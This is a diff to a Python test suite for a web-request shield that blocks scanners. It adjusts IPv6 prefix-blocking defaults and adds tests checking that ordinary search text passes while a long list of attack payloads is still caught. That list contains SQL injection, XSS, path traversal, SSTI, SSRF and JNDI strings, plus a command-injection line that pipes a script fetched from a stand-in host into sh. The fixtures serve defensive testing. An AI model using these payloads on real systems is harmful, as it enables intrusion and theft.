@@ -10,6 +10,7 @@ import tempfile
 import threading
 import time
 import unittest
+import urllib.parse
 from datetime import datetime, timedelta, timezone
 from unittest import mock
 
@@ -949,7 +950,7 @@ class BlockTable(unittest.TestCase):
         self.assertEqual(len(s._blocks), 1)
 
     def test_rotating_ipv6_networks_gets_the_wider_prefix_blocked(self):
-        s, c = shield()
+        s, c = shield(v6_escalate_after=8)
         for i in range(7):
             s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
         self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")   # seven: not yet
@@ -964,7 +965,7 @@ class BlockTable(unittest.TestCase):
         self.assertEqual(s.blocklist(), {})
 
     def test_rotation_across_wider_networks_escalates_again(self):
-        s, _ = shield()
+        s, _ = shield(v6_escalate_after=8)
         for net in range(8):                      # eight /56s, eight /64s in each
             for i in range(8):
                 s.check(f"2001:db8:6:{net:x}{i:02x}::1", "GET", "/", headers=SCANNER)
@@ -974,15 +975,21 @@ class BlockTable(unittest.TestCase):
         self.assertTrue(s.unblock("2001:db8:6:f00d::1"))                 # lifting it for one address lifts the prefix
         self.assertEqual(s.check("2001:db8:6:f00d::1", "GET", "/", headers=BROWSER).action, "pass")
 
-    def test_escalation_can_be_switched_off(self):
-        s, _ = shield(v6_escalate_after=0)
-        for i in range(40):
-            s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
-        self.assertEqual(len(s.blocklist()), 40)
-        self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")
+    def test_widening_is_off_by_default(self):
+        # A /56 or /48 can hold hundreds of a provider's customers, so blocking
+        # one is something an operator must ask for.
+        self.assertEqual(Config().v6_escalate_after, 0)
+        for s, _ in (shield(), shield(v6_escalate_after=0)):
+            for i in range(40):
+                s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
+            self.assertEqual(len(s.blocklist()), 40)
+            self.assertTrue(all(net.endswith("/64") for net in s.blocklist()))
+            self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")
+        with self.assertRaises(ValueError):
+            Config(v6_escalate_after=1)
 
     def test_neighbours_of_a_few_blocked_networks_are_untouched(self):
-        s, c = shield()
+        s, c = shield(v6_escalate_after=8)
         for i in range(3):
             s.check(f"2001:db8:8:{i:x}::1", "GET", "/", headers=SCANNER)
         for i in range(16, 200):                  # the rest of the street
@@ -1116,6 +1123,120 @@ class Evasions(unittest.TestCase):
         typed = dict(BROWSER, Referer="https://shop.example/search?q=1' UNION SELECT null--", Host="shop.example",
                      Cookie="last=<script>alert(1)</script>")
         self.assertEqual(self.hits("", typed), [])
+
+
+# What people type into a search box. Every one of these used to score as an
+# attack payload: a book with a colon or a year in brackets, quoted titles
+# joined by "and", recipes with apostrophes, programming questions.
+EVERYDAY_SEARCHES = [
+    # books
+    "javascript: the good parts", "JavaScript: The Definitive Guide (7th edition)",
+    "javascript: understanding the weird parts (course)", "Why We Sleep (2017) Matthew Walker",
+    "'Salem's Lot", "'Dune' and '1984'", "'The Road' or 'Blood Meridian'", '"Catch-22" and "Slaughterhouse-Five"',
+    "Harry Potter and the Philosopher's Stone", "The Hitchhiker's Guide to the Galaxy", "'Tis: A Memoir",
+    "Charlotte's Web or Stuart Little", '"Pride and Prejudice" or "Emma"', "Don't Make Me Think (2nd edition)",
+    "O'Reilly 'Learning Python' or 'Fluent Python'", "Tolkien 'The Hobbit' and 3 other books",
+    "'Night Shift' or 'Skeleton Crew' stephen king", "Rock 'n' Roll: A Social History",
+    "'Dune' or true crime", "'It' and 'Carrie' (1976 film)",
+    # recipes
+    "chicken tikka masala (serves 4)", "mac 'n' cheese", "grandma's apple pie", "salt & pepper squid",
+    "bake at 350°F (175°C) for 25-30 min", "1/2 cup sugar; 2 eggs; 1 tsp vanilla", "slow cooker chili | easy | 8 hours",
+    "shepherd's pie or cottage pie", "meal plan for 3 kids' and 2 adults", "fish 'n' chips", "s'mores without a campfire",
+    "'no knead' bread or focaccia", "eggs benedict & hollandaise (blender)", "sourdough starter (day 1)",
+    "'salt' and 'pepper' to taste", "brownies 9x13 (serves 12-16)", "2 eggs or 1 banana as substitute",
+    # everyday
+    "sleep (8 hours)", "how much sleep (7-9 hours) do adults need", "benchmark (2024) gpu",
+    "student union select committee", "credit union select checking account",
+    # programming questions
+    "how to use <script tags in html", "<script async vs defer", "what does the <script> tag do",
+    "python time.sleep(5) not working", "how to sleep 5 seconds in bash", "sql union select example",
+    "sql union all select vs union", "mysql information_schema.tables size", "waitfor delay sql server example",
+    "window.onload = function vs DOMContentLoaded", "img onerror= fallback image", "<iframe> embed youtube responsive",
+    '<svg viewBox="0 0 24 24"> icon size', "jest cannot find module '../../utils'", "import styles from '../../theme.css'",
+    "difference between == and === in javascript", "rust Option<T> unwrap vs expect", "c++ std::vector<int> push_back",
+    "regex lookahead (?=...) example", "bash if [ -f file ]; then echo exists", "git log --oneline && git status",
+    'href="javascript:void(0)" meaning', "jinja2 {{ variable|default('none') }}", "flask {{ config.SECRET_KEY }} in template",
+    "find . -name '*.py' | xargs grep TODO", "python f'{name!r}' formatting", "sql where 1=1 meaning",
+    "kubectl get pods -o wide | grep Running", "node fetch('/api').then(res => res.json())", "css :not(.active) selector",
+    "powershell Get-ChildItem | Select-Object Name", "typescript Record<string, number>", "cron */5 * * * * every 5 minutes",
+    "geekbench cpu benchmark(single core)", "<button onclick= not working", "sleep sort algorithm (joke)",
+]
+
+# Payloads from scanners and the usual cheat sheets. They must all still be
+# caught, including the forms the search-text fix had to tell apart.
+ATTACK_PAYLOADS = {
+    "payload:sqli": [
+        "1' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", '" OR "1"="1', "' OR 'a'='a", "') OR ('1'='1",
+        "admin' OR 1=1#", "1 OR 1=1", "1' AND 1=1--", "1' AND 1=2--", "1 AND 1=2", "' OR ''='", "x' or 1 or 'x",
+        "' or '1", "' or true--", "' or 1--", "' or 2>1--", "' and substring(@@version,1,1)='5", "' or exists(select 1)--",
+        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL,NULL--", "1 UNION ALL SELECT 1,2,3", "-1 union select 1",
+        "-1 UNION SELECT username,password FROM users--", "' UNION SELECT @@version--",
+        "1' UNION SELECT table_name FROM information_schema.tables--", "1 UNION/**/SELECT/**/1,2",
+        "1/**/UNION/**/ALL/**/SELECT/**/NULL", "1 AND SLEEP(5)", "1' AND SLEEP(5)--", "'||pg_sleep(5)--",
+        "1; SELECT pg_sleep(5)--", "1); WAITFOR DELAY '0:0:5'--", "1 AND BENCHMARK(5000000,MD5(1))",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "IF(1=1,SLEEP(5),0)", "sleep(5)",
+        "1 AND extractvalue(1,concat(0x7e,version()))", "1 AND updatexml(1,concat(0x7e,user()),1)",
+        "'; EXEC xp_cmdshell('whoami')--", "' AND 1=CONVERT(int,(SELECT @@version))--", "%' AND 1=1 AND '%'='",
+        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+    ],
+    "payload:xss": [
+        "<script>alert(1)</script>", '"><script>alert(1)</script>', "<script>alert(document.domain)</script>",
+        "<ScRiPt>alert(1)</sCrIpT>", "<script src=//xss.example/x.js></script>", "<script/src=data:,alert(1)>",
+        "</script><script>alert(1)</script>", "<scr<script>ipt>alert(1)</scr</script>ipt>", "<svg><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>", '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
+        "<body onload=alert(1)>", '<iframe src="javascript:alert(1)">', '<iframe srcdoc="&lt;script&gt;alert(1)">',
+        "<iframe src=//evil.example>", "javascript:alert(1)", "javascript:alert(document.cookie)", "JaVaScRiPt:alert(1)",
+        "javascript://%0aalert(1)", "javascript:%0aalert(1)", "javascript:void(0);alert(1)", '<a href="javascript:alert(1)">x</a>',
+        '" onmouseover="alert(1)', "' onfocus='alert(1)' autofocus='", '" autofocus onfocus=alert(1) x="',
+        "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "<marquee onstart=alert(1)>", "<img src=x onerror=alert`1`>",
+        "<video><source onerror=alert(1)>", '<object data="javascript:alert(1)">', "x onerror=alert(1)",
+        "<img src=x onerror=alert;throw 1>", "<form action=javascript:alert(1)><input type=submit>",
+    ],
+    "payload:traversal": [
+        "../../../etc/passwd", "../../../../../../etc/passwd", "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
+        "../../../../windows/win.ini", "/etc/passwd", "../../../../proc/self/environ", "../../WEB-INF/web.xml", "../../.env",
+        "../../../../../../boot.ini", "../../config.php", "../../../app/etc/env.php", "..%2f..%2f..%2fetc%2fpasswd",
+    ],
+    "payload:cmdi": [
+        "; cat /etc/passwd", "| whoami", "|| id", "&& whoami", "$(whoami)", "`id`", "; sleep 5", "| ping -c 5 127.0.0.1",
+        "\ncat /etc/passwd", "; curl http://x.example/s.sh | sh", "127.0.0.1; ls -la",
+    ],
+    "payload:ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}", "{{self.__init__.__globals__}}", "{{7*'7'}}"],
+    "payload:ssrf-metadata": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"],
+    "payload:jndi": ["${jndi:ldap://x.oast.fun/a}"],
+}
+
+
+class SearchText(unittest.TestCase):
+    """Search boxes take free text. A title, a recipe or a programming question
+    must not read as an attack; the attack itself still must."""
+
+    def payload_hits(self, query, path="/search"):
+        s, _ = shield()
+        return [h for h in s.check("192.0.2.140", "GET", path, query, BROWSER).hits if h.startswith("payload:")]
+
+    def test_everyday_searches_are_not_payloads(self):
+        scored = {text: hits for text in EVERYDAY_SEARCHES
+                  if (hits := self.payload_hits("q=" + urllib.parse.quote_plus(text)))}
+        self.assertEqual(scored, {})
+
+    def test_everyday_searches_are_served(self):
+        s, c = shield()
+        visit = wsgi_site(s, real=("/search",))
+        for text in EVERYDAY_SEARCHES * 3:        # one person searching for all of it, three times over
+            c.t += 4
+            self.assertEqual(visit("/search", "q=" + urllib.parse.quote_plus(text)), 200, text)
+        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)
+
+    def test_attack_payloads_are_still_caught(self):
+        missed = {}
+        for label, payloads in ATTACK_PAYLOADS.items():
+            for payload in payloads:
+                for query in ("id=" + urllib.parse.quote(payload, safe=""), "q=" + urllib.parse.quote_plus(payload)):
+                    if label not in self.payload_hits(query, "/item"):
+                        missed.setdefault(label, []).append(query)
+        self.assertEqual(missed, {})
 
 
 class SlowGuessing(unittest.TestCase):
@@ -1261,7 +1382,9 @@ class Cost(unittest.TestCase):
         # Repeated fragments each pattern almost matches: the shape that makes a
         # backtracking engine retry from every position.
         atoms = ["a", "db", "a-", "a.", "/", " ", "\n", "\r\n ", "; ", ";\n", "/*", "/* a ", "*/", "' or ", "{{ ", " on",
-                 " onmouse", "#{1", "${T", "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
+                 " onmouse", "#{1", "${T", "../", "..\\", "javascript:", "javascript: ", "<script>", "<script ",
+                 "' and '1", "' or 1 ", "union select ", "1 union select ", "sleep(", "<iframe ", "<x onclick=",
+                 "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
                  "' ", "' or ", "sleep ( ", "; ", "| cat ", "{{1 ", "${ ", "<%= 1", "on", "onload ", "<svg",
                  "backup.", "/wp-config.php.a", "/swagger/", "/admin/", "x.oast", "-.", "curl/"]
         slow = []
